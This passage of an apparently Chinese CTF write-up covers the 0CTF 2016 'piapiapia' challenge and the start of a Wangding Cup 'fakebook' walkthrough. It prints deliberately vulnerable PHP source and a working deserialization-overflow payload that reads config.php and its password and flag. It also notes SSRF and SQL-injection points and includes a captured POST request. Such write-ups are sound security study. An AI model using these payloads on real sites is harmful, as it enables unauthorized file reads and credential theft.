src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后是update.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">		if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">			die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">			die(&apos;Invalid email&apos;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">		if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">			die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">		$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">		$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">		$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">		$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">			&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>核心的处理代码，class.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">class user extends mysql&#123;</span><br><span class="line">	private $table = &apos;users&apos;;</span><br><span class="line"></span><br><span class="line">	public function is_exists($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::select($this-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function register($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = Array(&apos;username&apos;, &apos;password&apos;);</span><br><span class="line">		$value_list = Array($username, md5($password));</span><br><span class="line">		return parent::insert($this-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	public function login($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			return true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public function show_profile($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		return $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class mysql &#123;</span><br><span class="line">	private $link = null;</span><br><span class="line"></span><br><span class="line">	public function connect($config) &#123;</span><br><span class="line">		$this-&gt;link = mysql_connect(</span><br><span class="line">			$config[&apos;hostname&apos;],</span><br><span class="line">			$config[&apos;username&apos;], </span><br><span class="line">			$config[&apos;password&apos;]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[&apos;database&apos;]);</span><br><span class="line">		mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);</span><br><span class="line"></span><br><span class="line">		return $this-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function select($table, $where, $ret = &apos;*&apos;) &#123;</span><br><span class="line">		$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">		$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">		return mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert($table, $key_list, $value_list) &#123;</span><br><span class="line">		$key = implode(&apos;,&apos;, $key_list);</span><br><span class="line">		$value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;; </span><br><span class="line">		$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = new user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>
+
+<p>最后是config.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">	$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">	$config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">	$config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">	$flag = &apos;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>看来flag就是在config.php中了，要想办法拿到config.php的内容了。然后就是代码审计了。<br>这个地方貌似有个文件读取的地方，在profile.php中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面还有个反序列化unserialize，感觉有戏，如果$profile[‘photo’]是config.php就可以读取到了，可以对photo进行操作的地方在update.php，有phone、email、nickname和photo这几个。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br><span class="line">print_r(unserialize($profile));</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] =&gt; 12345678901</span><br><span class="line">    [email] =&gt; ss@q.com</span><br><span class="line">    [nickname] =&gt; sea_sand</span><br><span class="line">    [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到反序列化之后，最后面upload这一部分就没了，下面就是想办法把config.php塞进去了。</p>
+<p>从数组顺序上看是和上面数组的顺序一样的，可以抓个包看下post顺序，那么最有可能的就是从nickname下手了。</p>
+<p>在设置了$profile之后，用update_profile()函数进行处理：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行了过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line"></span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有两个正则过滤，带上输入nickname时候有一个正则，总共三个过滤的地方，首先要绕过第一个输入时候的正则：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line">数组即可绕过：</span><br><span class="line">nickname[]=</span><br><span class="line"></span><br><span class="line">那么$profile就是这样了：</span><br><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;xxx&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面的正则要怎么利用呢，可以看到如果我们输入的有where，会替换成hacker，这样的话长度就变了，序列化后的每个变量都是有长度的，那么反序列化会怎么处理呢？我们应该怎么构造呢？</p>
+<p>数组绕过了第一个正则过滤之后，如果nickname最后面塞上”;}s:5:“photo”;s:10:“config.php”;}，一共是34个字符，如果利用正则替换34个where，不就可以把这34个给挤出去，后面的upload因为序列化串被我们闭合了也就没用了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在where被正则匹配换成hacker之后，正好满足长度，然后后面的”};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。</p>
+<p>下面开始操作：<br>注册之后登陆，进入到update.php页面，输入信息及上传图片，用bp抓包把nickname改成数组即可.<br>然后进入到profile中查看图片信息，把base64码解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezBjdGZfMjAxNl91bnNlcmlhbGl6ZV9pc192ZXJ5X2dvb2QhfSc7Cj8+Cg==</span><br><span class="line"></span><br><span class="line">解码得到：</span><br><span class="line">&lt;?php</span><br><span class="line">$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">$config[&apos;password&apos;] = &apos;qwertyuiop&apos;;</span><br><span class="line">$config[&apos;database&apos;] = &apos;challenges&apos;;</span><br><span class="line">$flag = &apos;flag&#123;0ctf_2016_unserialize_is_very_good!&#125;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="网鼎杯-fakebook"><a href="#网鼎杯-fakebook" class="headerlink" title="网鼎杯 fakebook"></a>网鼎杯 fakebook</h1><ul>
+<li>nikto扫描:<code>nikto -host url</code><br>发现隐藏的robots.txt，其中有源码泄漏（/user.php.bak），输入到地址栏，得到文件user.php.bak。然后用御剑扫描，发现flag.php。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">user.php.bak源码：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();                                   //初始化一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);                 //设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output = curl_exec($ch);                            //运行cURL，请求网页</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);          //关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
+<p>对注册页面和登陆页面进行post注入探测，发现注册页面中username一栏存在post注入。然后随意注册一个账户，登陆进去以后，发现/view.php?no=1,存在get注入。将no参数改为不存在的值，php报错，得到网站配置文件的后台物理路径/var/www/html/。</p>
+<ul>
+<li>我选择了post注入，因为先发现了post，所以就用burpsuite截取了post数据包，保存为post.txt.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /join.ok.php HTTP/1.1</span><br><span class="line">Host: http://f60c34e18065457cab2a8f72a615f74aeed1bc0d1cd84c6d.game.ichunqiu.com/</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Referer: http://f60c34e18065457cab2a8f72a615f74aeed1bc0d1cd84c6d.game.ichunqiu.com/join.php</span><br><span class="line">Cookie: UM_distinctid=1655535613c89-0225b46f53fa79-38694646-100200-1655535613e38; pgv_pvi=3838269440; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1534816179,1534831680,1534834500,1534848123; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=b6cdb3f35d0c299c39a2a581c0de505887626935; pgv_si=s4980557824; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1534848148; PHPSESSID=dcgbips79uln77iea8bol6u4d5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">username=1&amp;passwd=1&amp;age=1&amp;blog=https%3A%2F%2Fwww.csdn.net%2F</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
